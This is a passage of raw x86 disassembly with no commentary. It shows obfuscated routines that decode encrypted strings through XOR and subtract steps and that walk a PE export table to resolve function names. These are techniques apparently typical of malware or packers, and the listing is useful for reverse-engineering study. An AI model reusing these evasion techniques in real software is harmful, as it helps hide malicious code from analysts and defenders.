  42225a:	xor    edi,esi
  42225c:	mov    cx,WORD PTR [eax+edi*2+0x64e5f4]
  422264:	mov    ebx,0x3b5f
  422269:	sub    cx,bx
  42226c:	mov    ebx,0x8a9d
  422271:	xor    cx,bx
  422274:	mov    ebx,0x4e3c
  422279:	cmp    cx,bx
  42227c:	jne    0x422246
  42227e:	mov    ecx,DWORD PTR [ebp-0x4]
  422281:	pop    edi
  422282:	pop    ebx
  422283:	cmp    ecx,0xf89c85b6
  422289:	je     0x422294
  42228b:	xor    ecx,esi
  42228d:	lea    eax,[eax+ecx*2+0x64e5f6]
  422294:	pop    esi
  422295:	leave  
  422296:	ret    
  422297:	push   ebp
  422298:	mov    ebp,esp
  42229a:	push   ecx
  42229b:	push   esi
  42229c:	push   edi
  42229d:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4222a4:	mov    esi,0xf89c85b5
  4222a9:	call   0x422209
  4222ae:	mov    edi,eax
  4222b0:	mov    al,BYTE PTR [edi]
  4222b2:	sub    al,0x6
  4222b4:	xor    al,0x81
  4222b6:	cmp    al,0x7b
  4222b8:	je     0x42231b
  4222ba:	mov    eax,edi
  4222bc:	mov    edx,0xffcd8d06
  4222c1:	mov    ecx,0x75108b3
  4222c6:	push   ebx
  4222c7:	mov    ax,WORD PTR [eax]
  4222ca:	mov    ebx,0x3b5f
  4222cf:	sub    ax,bx
  4222d2:	mov    ebx,0x8a9d
  4222d7:	xor    ax,bx
  4222da:	mov    ebx,0x4e52
  4222df:	cmp    ax,bx
  4222e2:	jne    0x4222e7
  4222e4:	mov    DWORD PTR [ebp-0x4],esi
  4222e7:	lea    esi,[edx+0x1]
  4222ea:	xor    esi,ecx
  4222ec:	mov    edx,esi
  4222ee:	xor    edx,ecx
  4222f0:	lea    eax,[edi+edx*2+0x64e5f4]
  4222f7:	mov    bl,BYTE PTR [eax]
  4222f9:	sub    bl,0x6
  4222fc:	xor    bl,0x81
  4222ff:	cmp    bl,0x7b
  422302:	jne    0x4222c7
  422304:	mov    eax,DWORD PTR [ebp-0x4]
  422307:	pop    ebx
  422308:	cmp    eax,0xf89c85b6
  42230d:	je     0x42231b
  42230f:	xor    eax,ecx
  422311:	xor    ecx,ecx
  422313:	mov    WORD PTR [edi+eax*2+0x64e5f4],cx
  42231b:	mov    eax,edi
  42231d:	pop    edi
  42231e:	pop    esi
  42231f:	leave  
  422320:	ret    
  422321:	push   ebp
  422322:	mov    ebp,esp
  422324:	push   ecx
  422325:	push   esi
  422326:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42232d:	mov    esi,0xf89c85b5
  422332:	call   0x422209
  422337:	mov    cx,WORD PTR [eax]
  42233a:	mov    edx,0x3b5f
  42233f:	sub    cx,dx
  422342:	mov    edx,0x8a9d
  422347:	xor    cx,dx
  42234a:	mov    edx,0x4e3c
  42234f:	cmp    cx,dx
  422352:	je     0x4223ab
  422354:	push   ebx
  422355:	push   edi
  422356:	movzx  ecx,cx
  422359:	mov    edx,0xffcd8d06
  42235e:	mov    edi,0x75108b3
  422363:	mov    ebx,0x4e52
  422368:	cmp    cx,bx
  42236b:	jne    0x422370
  42236d:	mov    DWORD PTR [ebp-0x4],esi
  422370:	lea    esi,[edx+0x1]
  422373:	xor    esi,edi
  422375:	mov    edx,esi
  422377:	xor    edx,edi
  422379:	mov    cx,WORD PTR [eax+edx*2+0x64e5f4]
  422381:	mov    ebx,0x3b5f
  422386:	sub    cx,bx
  422389:	mov    ebx,0x8a9d
  42238e:	xor    cx,bx
  422391:	mov    ebx,0x4e3c
  422396:	cmp    cx,bx
  422399:	jne    0x422363
  42239b:	cmp    DWORD PTR [ebp-0x4],0xf89c85b6
  4223a2:	pop    edi
  4223a3:	pop    ebx
  4223a4:	je     0x4223ab
  4223a6:	xor    eax,eax
  4223a8:	inc    eax
  4223a9:	jmp    0x4223ad
  4223ab:	xor    eax,eax
  4223ad:	pop    esi
  4223ae:	leave  
  4223af:	ret    
  4223b0:	push   ebp
  4223b1:	mov    ebp,esp
  4223b3:	push   ecx
  4223b4:	mov    eax,DWORD PTR [ebp+0x8]
  4223b7:	movzx  ecx,WORD PTR [eax]
  4223ba:	push   esi
  4223bb:	lea    eax,[ecx-0x3b5f]
  4223c1:	mov    esi,0x8a9d
  4223c6:	push   edi
  4223c7:	xor    eax,esi
  4223c9:	mov    edi,0x4e3c
  4223ce:	mov    DWORD PTR [ebp-0x4],edx
  4223d1:	cmp    ax,di
  4223d4:	je     0x422401
  4223d6:	mov    eax,DWORD PTR [ebp+0x8]
  4223d9:	sub    eax,edx
  4223db:	mov    DWORD PTR [ebp+0x8],eax
  4223de:	jmp    0x4223e3
  4223e0:	mov    eax,DWORD PTR [ebp+0x8]
  4223e3:	mov    WORD PTR [edx],cx
  4223e6:	add    edx,0x2
  4223e9:	movzx  edi,WORD PTR [eax+edx*1]
  4223ed:	mov    ecx,edi
  4223ef:	add    edi,0xffffc4a1
  4223f5:	xor    edi,esi
  4223f7:	mov    eax,0x4e3c
  4223fc:	cmp    di,ax
  4223ff:	jne    0x4223e0
  422401:	xor    eax,eax
  422403:	pop    edi
  422404:	mov    WORD PTR [edx],ax
  422407:	mov    eax,DWORD PTR [ebp-0x4]
  42240a:	pop    esi
  42240b:	leave  
  42240c:	ret    0x4
  42240f:	push   ebp
  422410:	mov    ebp,esp
  422412:	sub    esp,0x18
  422415:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  42241c:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  422423:	mov    ecx,DWORD PTR [ebp-0x8]
  422426:	push   esi
  422427:	mov    eax,0x75108b3
  42242c:	xor    ecx,eax
  42242e:	mov    esi,0x3272fa
  422433:	add    ecx,esi
  422435:	mov    DWORD PTR [ebp-0x4],ecx
  422438:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42243f:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  422446:	push   edi
  422447:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  42244e:	jmp    0x4224ef
  422453:	mov    ecx,DWORD PTR [ebp-0x4]
  422456:	mov    edx,DWORD PTR [ebp+0x10]
  422459:	sub    edx,ecx
  42245b:	mov    ecx,DWORD PTR [ebp-0xc]
  42245e:	xor    ecx,eax
  422460:	add    ecx,esi
  422462:	cmp    edx,ecx
  422464:	jbe    0x422481
  422466:	mov    edx,DWORD PTR [ebp-0x4]
  422469:	add    edx,DWORD PTR [ebp+0x8]
  42246c:	mov    ecx,DWORD PTR [ebp-0x4]
  42246f:	add    ecx,DWORD PTR [ebp+0xc]
  422472:	mov    edi,DWORD PTR [ecx]
  422474:	mov    DWORD PTR [edx],edi
  422476:	mov    ecx,DWORD PTR [ecx+0x4]
  422479:	mov    DWORD PTR [edx+0x4],ecx
  42247c:	mov    ecx,DWORD PTR [ebp-0xc]
  42247f:	jmp    0x4224ce
  422481:	mov    ecx,DWORD PTR [ebp-0x4]
  422484:	mov    edx,DWORD PTR [ebp+0x10]
  422487:	sub    edx,ecx
  422489:	mov    ecx,DWORD PTR [ebp-0x10]
  42248c:	xor    ecx,eax
  42248e:	add    ecx,esi
  422490:	cmp    edx,ecx
  422492:	mov    ecx,DWORD PTR [ebp-0x4]
  422495:	jbe    0x4224a9
  422497:	add    ecx,DWORD PTR [ebp+0x8]
  42249a:	mov    edx,DWORD PTR [ebp-0x4]
  42249d:	add    edx,DWORD PTR [ebp+0xc]
  4224a0:	mov    edx,DWORD PTR [edx]
  4224a2:	mov    DWORD PTR [ecx],edx
  4224a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4224a7:	jmp    0x4224ce
  4224a9:	mov    edx,DWORD PTR [ebp+0x10]
  4224ac:	sub    edx,ecx
  4224ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4224b1:	xor    ecx,eax
  4224b3:	add    ecx,esi
  4224b5:	cmp    edx,ecx
  4224b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4224ba:	jbe    0x4224df
  4224bc:	add    ecx,DWORD PTR [ebp+0x8]
  4224bf:	mov    edx,DWORD PTR [ebp-0x4]
  4224c2:	add    edx,DWORD PTR [ebp+0xc]
  4224c5:	mov    dx,WORD PTR [edx]
  4224c8:	mov    WORD PTR [ecx],dx
  4224cb:	mov    ecx,DWORD PTR [ebp-0x14]
  4224ce:	mov    edx,DWORD PTR [ebp-0x4]
  4224d1:	xor    ecx,eax
  4224d3:	lea    ecx,[ecx+edx*1+0x3272fa]
  4224da:	mov    DWORD PTR [ebp-0x4],ecx
  4224dd:	jmp    0x4224ef
  4224df:	add    ecx,DWORD PTR [ebp+0x8]
  4224e2:	mov    edx,DWORD PTR [ebp-0x4]
  4224e5:	add    edx,DWORD PTR [ebp+0xc]
  4224e8:	mov    dl,BYTE PTR [edx]
  4224ea:	mov    BYTE PTR [ecx],dl
  4224ec:	inc    DWORD PTR [ebp-0x4]
  4224ef:	mov    ecx,DWORD PTR [ebp-0x18]
  4224f2:	mov    edx,DWORD PTR [ebp+0x10]
  4224f5:	xor    ecx,eax
  4224f7:	add    ecx,esi
  4224f9:	imul   ecx,edx
  4224fc:	mov    edx,DWORD PTR [ebp-0x8]
  4224ff:	mov    edi,DWORD PTR [ebp-0x4]
  422502:	xor    edx,eax
  422504:	lea    edx,[edx+edi*1+0x3272fa]
  42250b:	cmp    edx,ecx
  42250d:	jb     0x422453
  422513:	pop    edi
  422514:	pop    esi
  422515:	leave  
  422516:	ret    0xc
  422519:	push   ebp
  42251a:	mov    ebp,esp
  42251c:	sub    esp,0xc
  42251f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  422526:	push   esi
  422527:	mov    esi,eax
  422529:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  422530:	mov    edx,DWORD PTR [ebp-0x4]
  422533:	mov    eax,0x75108b3
  422538:	xor    edx,eax
  42253a:	mov    ecx,0x3272fa
  42253f:	add    edx,ecx
  422541:	cmp    esi,edx
  422543:	je     0x422585
  422545:	push   ebx
  422546:	push   edi
  422547:	mov    edx,DWORD PTR [ebp-0x8]
  42254a:	mov    ebx,DWORD PTR [ebp+0x8]
  42254d:	xor    edx,eax
  42254f:	mov    edi,0xffcd8d06
  422554:	sub    edi,edx
  422556:	add    esi,edi
  422558:	lea    edx,[esi-0x3272fa]
  42255e:	xor    edx,eax
  422560:	mov    DWORD PTR [ebp-0xc],edx
  422563:	mov    edx,DWORD PTR [ebp-0x4]
  422566:	mov    edi,DWORD PTR [ebp-0xc]
  422569:	xor    dl,0xb3
  42256c:	sub    dl,0x6
  42256f:	xor    edi,eax
  422571:	mov    BYTE PTR [edi+ebx*1+0x3272fa],dl
  422578:	mov    edx,DWORD PTR [ebp-0x4]
  42257b:	xor    edx,eax
  42257d:	add    edx,ecx
  42257f:	cmp    esi,edx
  422581:	jne    0x422547
  422583:	pop    edi
  422584:	pop    ebx
  422585:	pop    esi
  422586:	leave  
  422587:	ret    0x4
  42258a:	push   ebp
  42258b:	mov    ebp,esp
  42258d:	sub    esp,0x21c
  422593:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42259a:	mov    DWORD PTR [ebp-0x14],0xf89c85b4
  4225a1:	mov    eax,DWORD PTR [ebp+0x10]
  4225a4:	mov    eax,DWORD PTR [ebp-0x4]
  4225a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4225aa:	push   esi
  4225ab:	push   edi
  4225ac:	mov    edi,0x75108b3
  4225b1:	xor    eax,edi
  4225b3:	mov    esi,0x3272fa
  4225b8:	add    eax,esi
  4225ba:	cmp    eax,ecx
  4225bc:	mov    eax,DWORD PTR [ebp-0x4]
  4225bf:	jne    0x4225ca
  4225c1:	xor    eax,edi
  4225c3:	add    eax,esi
  4225c5:	jmp    0x422676
  4225ca:	mov    ecx,DWORD PTR [ebp+0xc]
  4225cd:	xor    eax,edi
  4225cf:	add    eax,esi
  4225d1:	cmp    eax,ecx
  4225d3:	jne    0x4225da
  4225d5:	mov    eax,DWORD PTR [ebp-0x4]
  4225d8:	jmp    0x4225c1
  4225da:	lea    eax,[ebp-0x21c]
  4225e0:	mov    DWORD PTR [ebp-0x8],eax
  4225e3:	mov    eax,DWORD PTR [ebp+0xc]
  4225e6:	mov    DWORD PTR [ebp-0x10],eax
  4225e9:	mov    eax,DWORD PTR [ebp-0x4]
  4225ec:	xor    eax,edi
  4225ee:	add    eax,esi
  4225f0:	mov    DWORD PTR [ebp+0x10],eax
  4225f3:	mov    eax,DWORD PTR [ebp+0xc]
  4225f6:	push   ebx
  4225f7:	call   0x422321
  4225fc:	mov    ebx,eax
  4225fe:	mov    eax,DWORD PTR [ebp+0x8]
  422601:	mov    eax,DWORD PTR [eax+0x14]
  422604:	jmp    0x42265e
  422606:	mov    eax,DWORD PTR [ebp+0xc]
  422609:	sub    eax,0x8
  42260c:	mov    DWORD PTR [ebp-0xc],eax
  42260f:	mov    eax,DWORD PTR [ebp-0xc]
  422612:	mov    eax,DWORD PTR [eax+0x28]
  422615:	call   0x422209
  42261a:	mov    DWORD PTR [ebp+0x10],eax
  42261d:	push   DWORD PTR [ebp+0x10]
  422620:	mov    edx,DWORD PTR [ebp-0x8]
  422623:	call   0x4223b0
  422628:	mov    eax,DWORD PTR [ebp-0x4]
  42262b:	xor    eax,edi
  42262d:	add    eax,esi
  42262f:	cmp    eax,ebx
  422631:	jne    0x42263b
  422633:	mov    eax,DWORD PTR [ebp-0x8]
  422636:	call   0x422297
  42263b:	mov    eax,DWORD PTR [ebp-0x14]
  42263e:	xor    eax,edi
  422640:	add    eax,esi
  422642:	push   eax
  422643:	push   DWORD PTR [ebp-0x10]
  422646:	mov    eax,DWORD PTR [ebp-0x8]
  422649:	call   0x421fc3
  42264e:	mov    ecx,DWORD PTR [ebp-0x4]
  422651:	xor    ecx,edi
  422653:	add    ecx,esi
  422655:	cmp    eax,ecx
  422657:	je     0x42267c
  422659:	mov    eax,DWORD PTR [ebp+0xc]
  42265c:	mov    eax,DWORD PTR [eax]
  42265e:	mov    DWORD PTR [ebp+0xc],eax
  422661:	mov    eax,DWORD PTR [ebp+0x8]
  422664:	mov    ecx,DWORD PTR [ebp+0xc]
  422667:	add    eax,0x14
  42266a:	cmp    ecx,eax
  42266c:	jne    0x422606
  42266e:	mov    eax,DWORD PTR [ebp-0x4]
  422671:	xor    eax,edi
  422673:	add    eax,esi
  422675:	pop    ebx
  422676:	pop    edi
  422677:	pop    esi
  422678:	leave  
  422679:	ret    0xc
  42267c:	mov    eax,DWORD PTR [ebp-0xc]
  42267f:	mov    eax,DWORD PTR [eax+0x18]
  422682:	jmp    0x422675
  422684:	push   ebp
  422685:	mov    ebp,esp
  422687:	mov    eax,DWORD PTR [ebp+0xc]
  42268a:	sub    esp,0x10
  42268d:	cmp    DWORD PTR [ebp+0x8],0x0
  422691:	push   ebx
  422692:	push   esi
  422693:	push   edi
  422694:	je     0x422749
  42269a:	test   eax,eax
  42269c:	je     0x422749
  4226a2:	movzx  eax,WORD PTR [eax+0x20]
  4226a6:	mov    ecx,eax
  4226a8:	mov    DWORD PTR [ebp-0x10],eax
  4226ab:	xor    edx,edx
  4226ad:	and    DWORD PTR [ebp-0x8],edx
  4226b0:	mov    eax,0x8a9d
  4226b5:	xor    ecx,eax
  4226b7:	add    ecx,0x3b5f
  4226bd:	mov    DWORD PTR [ebp-0xc],ecx
  4226c0:	and    DWORD PTR [ebp-0x4],0x0
  4226c4:	xor    ecx,ecx
  4226c6:	push   0x7d
  4226c8:	pop    edi
  4226c9:	cmp    cx,WORD PTR [ebp-0xc]
  4226cd:	jae    0x422733
  4226cf:	lea    esi,[edx-0x3b5f]
  4226d5:	xor    esi,eax
  4226d7:	movzx  ecx,WORD PTR [ebp-0x4]
  4226db:	mov    ebx,DWORD PTR [ebp+0xc]
  4226de:	lea    ecx,[ebx+ecx*4]
  4226e1:	cmp    WORD PTR [ecx+0x2],si
  4226e5:	jne    0x42271e
  4226e7:	movzx  ecx,WORD PTR [ecx]
  4226ea:	mov    edi,0x4e3c
  4226ef:	cmp    cx,di
  4226f2:	jne    0x422700
  4226f4:	mov    ebx,DWORD PTR [ebp+0x8]
  4226f7:	movzx  edi,dx
  4226fa:	cmp    BYTE PTR [edi+ebx*1],0x0
  4226fe:	je     0x42272d
  422700:	mov    ebx,DWORD PTR [ebp+0x8]
  422703:	movzx  edi,dx
  422706:	movsx  di,BYTE PTR [edi+ebx*1]
  42270b:	mov    ebx,0x3b5f
  422710:	sub    di,bx
  422713:	xor    di,ax
  422716:	cmp    cx,di
  422719:	je     0x42272d
  42271b:	push   0x7b
  42271d:	pop    edi
  42271e:	inc    DWORD PTR [ebp-0x4]
  422721:	mov    cx,WORD PTR [ebp-0xc]
  422725:	cmp    WORD PTR [ebp-0x4],cx
  422729:	jb     0x4226d7
  42272b:	jmp    0x422733
  42272d:	inc    DWORD PTR [ebp-0x8]
  422730:	push   0x7a
  422732:	pop    edi
  422733:	mov    esi,DWORD PTR [ebp+0x8]
  422736:	movzx  ecx,dx
  422739:	cmp    BYTE PTR [ecx+esi*1],0x0
  42273d:	je     0x422752
  42273f:	inc    edx
  422740:	cmp    edi,0x7b
  422743:	jne    0x4226c0
  422749:	xor    eax,eax
  42274b:	pop    edi
  42274c:	pop    esi
  42274d:	pop    ebx
  42274e:	leave  
  42274f:	ret    0x8
  422752:	mov    ecx,DWORD PTR [ebp-0x8]
  422755:	add    ecx,0xffffc4a1
  42275b:	xor    cx,ax
  42275e:	xor    eax,eax
  422760:	cmp    cx,WORD PTR [ebp-0x10]
  422764:	sete   al
  422767:	jmp    0x42274b
  422769:	push   ebp
  42276a:	mov    ebp,esp
  42276c:	sub    esp,0x50
  42276f:	push   edi
  422770:	mov    edi,eax
  422772:	mov    eax,DWORD PTR [edi+0x1a8]
  422778:	cmp    DWORD PTR [eax],0x0
  42277b:	jne    0x422784
  42277d:	xor    eax,eax
  42277f:	jmp    0x4228b5
  422784:	push   DWORD PTR [ebp+0x8]
  422787:	push   0x2c
  422789:	pop    eax
  42278a:	call   0x422519
  42278f:	mov    edx,DWORD PTR [edi+0x1ac]
  422795:	lea    eax,[edi+0x22]
  422798:	mov    DWORD PTR [ebp-0x4c],eax
  42279b:	lea    eax,[edi+0x44]
  42279e:	mov    DWORD PTR [ebp-0x48],eax
  4227a1:	lea    eax,[edi+0x66]
  4227a4:	mov    DWORD PTR [ebp-0x44],eax
  4227a7:	lea    eax,[edi+0x88]
  4227ad:	mov    DWORD PTR [ebp-0x40],eax
  4227b0:	lea    eax,[edi+0xaa]
  4227b6:	mov    DWORD PTR [ebp-0x3c],eax
  4227b9:	lea    eax,[edi+0xcc]
  4227bf:	mov    DWORD PTR [ebp-0x38],eax
  4227c2:	lea    eax,[edi+0xee]
  4227c8:	mov    DWORD PTR [ebp-0x34],eax
  4227cb:	lea    eax,[edi+0x110]
  4227d1:	mov    DWORD PTR [ebp-0x30],eax
  4227d4:	lea    eax,[edi+0x132]
  4227da:	mov    DWORD PTR [ebp-0x2c],eax
  4227dd:	lea    eax,[edi+0x154]
  4227e3:	push   edi
  4227e4:	mov    DWORD PTR [ebp-0x50],edi
  4227e7:	mov    DWORD PTR [ebp-0x28],eax
  4227ea:	call   0x4228e9
  4227ef:	push   eax
  4227f0:	mov    eax,DWORD PTR [edi+0x1a8]
  4227f6:	push   DWORD PTR [eax]
  4227f8:	call   0x42258a
  4227fd:	mov    DWORD PTR [ebp-0x10],eax
  422800:	test   eax,eax
  422802:	je     0x4228b5
  422808:	mov    ecx,DWORD PTR [eax+0x3c]
  42280b:	push   ebx
  42280c:	push   esi
  42280d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  422811:	add    esi,eax
  422813:	mov    edi,DWORD PTR [esi+0x24]
  422816:	mov    ecx,DWORD PTR [esi+0x1c]
  422819:	mov    edx,DWORD PTR [esi+0x20]
  42281c:	mov    ebx,DWORD PTR [esi+0x18]
  42281f:	add    edi,eax
  422821:	mov    DWORD PTR [ebp-0x20],edi
  422824:	mov    edi,DWORD PTR [esi+0x14]
  422827:	add    ecx,eax
  422829:	add    edx,eax
  42282b:	mov    DWORD PTR [ebp-0xc],ecx
  42282e:	mov    DWORD PTR [ebp-0x1c],edx
  422831:	mov    DWORD PTR [ebp-0x8],edi
  422834:	cmp    edi,ebx
  422836:	ja     0x42283b
  422838:	mov    DWORD PTR [ebp-0x8],ebx
  42283b:	xor    ebx,ebx
  42283d:	mov    DWORD PTR [ebp-0x18],ebx
  422840:	cmp    DWORD PTR [ebp-0x8],ebx
  422843:	jbe    0x4228b3
  422845:	jmp    0x42284a
  422847:	mov    edx,DWORD PTR [ebp-0x1c]
  42284a:	mov    edi,DWORD PTR [ebp-0x20]
  42284d:	movzx  edi,WORD PTR [edi+ebx*2]
  422851:	cmp    ebx,DWORD PTR [esi+0x18]
  422854:	jae    0x4228b3
  422856:	cmp    edi,DWORD PTR [esi+0x14]
  422859:	jae    0x4228b3
  42285b:	mov    ebx,DWORD PTR [edx+ebx*4]
  42285e:	mov    edx,DWORD PTR [ebp+0x8]
  422861:	mov    edi,DWORD PTR [ecx+edi*4]
  422864:	mov    DWORD PTR [ebp-0x4],edx
  422867:	lea    edx,[ebp-0x50]
  42286a:	add    ebx,eax
  42286c:	add    edi,eax
  42286e:	sub    edx,DWORD PTR [ebp+0x8]
  422871:	mov    DWORD PTR [ebp-0x14],0xb
  422878:	mov    DWORD PTR [ebp-0x24],edx
  42287b:	mov    edx,DWORD PTR [ebp-0x4]
  42287e:	cmp    DWORD PTR [edx],0x0
  422881:	jne    0x42289e
  422883:	mov    eax,DWORD PTR [ebp-0x24]
  422886:	push   DWORD PTR [eax+edx*1]
  422889:	push   ebx
  42288a:	call   0x422684
  42288f:	mov    ecx,DWORD PTR [ebp-0xc]
  422892:	test   eax,eax
  422894:	je     0x42289b
  422896:	mov    eax,DWORD PTR [ebp-0x4]
  422899:	mov    DWORD PTR [eax],edi
  42289b:	mov    eax,DWORD PTR [ebp-0x10]
  42289e:	add    DWORD PTR [ebp-0x4],0x4
  4228a2:	dec    DWORD PTR [ebp-0x14]
  4228a5:	jne    0x42287b
  4228a7:	mov    ebx,DWORD PTR [ebp-0x18]
  4228aa:	inc    ebx
  4228ab:	mov    DWORD PTR [ebp-0x18],ebx
  4228ae:	cmp    ebx,DWORD PTR [ebp-0x8]
  4228b1:	jb     0x422847
  4228b3:	pop    esi
  4228b4:	pop    ebx
  4228b5:	pop    edi
  4228b6:	leave  
  4228b7:	ret    0x4
  4228ba:	push   ebp
  4228bb:	mov    ebp,esp
  4228bd:	mov    eax,DWORD PTR [ebp+0x8]
  4228c0:	push   esi
  4228c1:	push   DWORD PTR [eax+0x1e0]
  4228c7:	lea    esi,[eax+0x198]
  4228cd:	mov    eax,DWORD PTR [ebp+0x8]
  4228d0:	call   0x422769
  4228d5:	mov    ecx,DWORD PTR [esi]
  4228d7:	mov    DWORD PTR [ecx],eax
  4228d9:	mov    eax,DWORD PTR [esi]
  4228db:	xor    ecx,ecx
  4228dd:	cmp    DWORD PTR [eax],ecx
  4228df:	pop    esi
  4228e0:	setne  cl
  4228e3:	mov    eax,ecx
  4228e5:	pop    ebp
  4228e6:	ret    0x4
  4228e9:	mov    ecx,DWORD PTR [edi+0x188]
  4228ef:	push   ebx
  4228f0:	jmp    0x422905
  4228f2:	xor    eax,0x8a9d
  4228f7:	add    eax,0x3b5f
  4228fc:	mov    WORD PTR [ecx],ax
  4228ff:	add    ecx,0x2
  422902:	add    edx,0x2
  422905:	movzx  eax,WORD PTR [edx]
  422908:	mov    ebx,0x4e3c
  42290d:	cmp    ax,bx
  422910:	jne    0x4228f2
  422912:	xor    eax,eax
  422914:	mov    WORD PTR [ecx],ax
  422917:	mov    eax,DWORD PTR [edi+0x188]
  42291d:	pop    ebx
  42291e:	ret    
  42291f:	push   edi
  422920:	mov    edi,eax
  422922:	mov    eax,DWORD PTR [esi+0x188]
  422928:	shl    edi,0x6
  42292b:	add    eax,edi
  42292d:	jmp    0x422939
  42292f:	xor    cl,0x81
  422932:	add    cl,0x6
  422935:	mov    BYTE PTR [eax],cl
  422937:	inc    eax
  422938:	inc    edx
  422939:	mov    cl,BYTE PTR [edx]
  42293b:	cmp    cl,0x7b
  42293e:	jne    0x42292f
  422940:	mov    BYTE PTR [eax],0x0
  422943:	mov    eax,DWORD PTR [esi+0x188]
  422949:	add    eax,edi
  42294b:	pop    edi
  42294c:	ret    
  42294d:	push   ebp
  42294e:	mov    ebp,esp
  422950:	sub    esp,0x14
  422953:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42295a:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  422961:	mov    eax,DWORD PTR [ebx]
  422963:	mov    DWORD PTR [ebp-0x8],eax
  422966:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42296d:	push   esi
  42296e:	push   edi
  42296f:	mov    DWORD PTR [ebp-0x14],0xead71895
  422976:	mov    edi,DWORD PTR [ebp-0x4]
  422979:	mov    ecx,DWORD PTR [ebp-0x10]
  42297c:	mov    eax,0x75108b3
  422981:	xor    edi,eax
  422983:	mov    edx,0x3272fa
  422988:	xor    ecx,eax
  42298a:	add    edi,edx
  42298c:	add    ecx,edx
  42298e:	imul   edi,ecx
  422991:	jmp    0x4229d9
  422993:	mov    ecx,DWORD PTR [ebp-0x8]
  422996:	mov    esi,DWORD PTR [ebp-0x4]
  422999:	xor    ecx,eax
  42299b:	xor    esi,eax
  42299d:	add    ecx,edx
  42299f:	add    esi,edx
  4229a1:	test   esi,ecx
  4229a3:	mov    esi,DWORD PTR [ebp-0x8]
  4229a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4229a9:	je     0x4229c0
  4229ab:	xor    ecx,eax
  4229ad:	xor    esi,eax
  4229af:	add    ecx,edx
  4229b1:	add    esi,edx
  4229b3:	shr    esi,cl
  4229b5:	mov    ecx,DWORD PTR [ebp-0x14]
  4229b8:	xor    ecx,eax
  4229ba:	add    ecx,edx
  4229bc:	xor    esi,ecx
  4229be:	jmp    0x4229ca
  4229c0:	xor    esi,eax
  4229c2:	xor    ecx,eax
  4229c4:	add    esi,edx
  4229c6:	add    ecx,edx
  4229c8:	shr    esi,cl
  4229ca:	mov    DWORD PTR [ebp-0x8],esi
  4229cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4229d0:	xor    ecx,eax
  4229d2:	lea    edi,[edi+ecx*1+0x3272fa]
  4229d9:	mov    ecx,DWORD PTR [ebp-0xc]
  4229dc:	mov    esi,DWORD PTR [ebp-0x4]
  4229df:	xor    esi,eax
  4229e1:	xor    ecx,eax
  4229e3:	sub    ecx,esi
  4229e5:	cmp    edi,ecx
  4229e7:	jbe    0x422993
  4229e9:	mov    eax,DWORD PTR [ebp-0x8]
  4229ec:	pop    edi
  4229ed:	mov    DWORD PTR [ebx],eax
  4229ef:	mov    eax,DWORD PTR [ebp-0x8]
  4229f2:	pop    esi
  4229f3:	leave  
  4229f4:	ret    
  4229f5:	push   ebp
  4229f6:	mov    ebp,esp
  4229f8:	sub    esp,0x38
  4229fb:	push   ebx
  4229fc:	mov    ebx,0xf89c85b5
  422a01:	mov    DWORD PTR [ebp-0x4],ebx
  422a04:	lea    ecx,[ebx-0x1]
  422a07:	mov    DWORD PTR [ebp-0x24],ecx
  422a0a:	mov    eax,DWORD PTR [ebp-0x4]
  422a0d:	mov    edx,DWORD PTR [ebp+0x8]
  422a10:	push   esi
  422a11:	mov    esi,0x75108b3
  422a16:	xor    eax,esi
  422a18:	push   edi
  422a19:	mov    edi,0x3272fa
  422a1e:	add    eax,edi
  422a20:	cmp    edx,eax
  422a22:	mov    eax,DWORD PTR [ebp-0x4]
  422a25:	je     0x422b8a
  422a2b:	mov    edx,DWORD PTR [ebp+0xc]
  422a2e:	xor    eax,esi
  422a30:	add    eax,edi
  422a32:	cmp    edx,eax
  422a34:	je     0x422b87
  422a3a:	mov    eax,DWORD PTR [ebp+0x10]
  422a3d:	mov    edx,DWORD PTR [ebp+0xc]
  422a40:	mov    DWORD PTR [ebp-0x14],eax
  422a43:	mov    eax,DWORD PTR [ebp+0x8]
  422a46:	mov    DWORD PTR [ebp-0x18],0xf89c8522
  422a4d:	mov    DWORD PTR [ebp-0xc],eax
  422a50:	lea    eax,[ebx+0x6]
  422a53:	mov    DWORD PTR [ebp-0x1c],eax
  422a56:	mov    DWORD PTR [ebp-0x10],ebx
  422a59:	mov    DWORD PTR [ebp+0xc],ecx
  422a5c:	mov    DWORD PTR [ebp+0x10],eax
  422a5f:	mov    eax,DWORD PTR [ebp+0xc]
  422a62:	xor    eax,esi
  422a64:	mov    DWORD PTR [ebp-0x20],edx
  422a67:	sub    edx,eax
  422a69:	sub    edx,edi
  422a6b:	mov    DWORD PTR [ebp+0x8],edx
  422a6e:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  422a75:	jmp    0x422b77
  422a7a:	mov    eax,DWORD PTR [ebp+0xc]
  422a7d:	mov    ecx,DWORD PTR [ebp+0xc]
  422a80:	xor    eax,esi
  422a82:	xor    ecx,esi
  422a84:	lea    ecx,[eax+ecx*1+0x64e5f4]
  422a8b:	mov    eax,DWORD PTR [ebp+0x8]
  422a8e:	xor    edx,edx
  422a90:	div    ecx
  422a92:	mov    eax,DWORD PTR [ebp+0x10]
  422a95:	mov    ecx,DWORD PTR [ebp+0xc]
  422a98:	xor    eax,esi
  422a9a:	xor    ecx,esi
  422a9c:	sub    eax,ecx
  422a9e:	cmp    edx,eax
  422aa0:	jne    0x422b36
  422aa6:	mov    eax,DWORD PTR [ebp+0x8]
  422aa9:	mov    ecx,DWORD PTR [ebp-0xc]
  422aac:	mov    dl,BYTE PTR [eax+ecx*1]
  422aaf:	mov    eax,DWORD PTR [ebp-0x10]
